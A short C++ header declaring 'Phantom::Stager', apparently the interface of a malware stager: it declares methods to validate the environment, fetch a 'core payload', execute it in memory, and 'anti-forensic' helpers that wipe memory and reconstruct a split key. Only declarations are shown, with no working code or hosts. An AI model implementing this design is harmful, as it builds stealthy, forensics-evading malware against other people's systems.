#ifndef PHANTOM_STAGER_H
#define PHANTOM_STAGER_H

#include <string>
#include <vector>

namespace Phantom {
    class Stager {
    public:
        Stager();
        ~Stager();

        bool run();

    private:
        std::string derive_master_key();
        bool validate_environment();
        std::vector<unsigned char> fetch_core(const std::string& key);
        bool execute_in_memory(const std::vector<unsigned char>& core_payload);

        // Anti-forensic helpers
        void wipe_memory(void* ptr, size_t size);
        void register_key_reconstruction(const std::string& split_key_a, const std::string& split_key_b);
    };
}

#endif // PHANTOM_STAGER_H
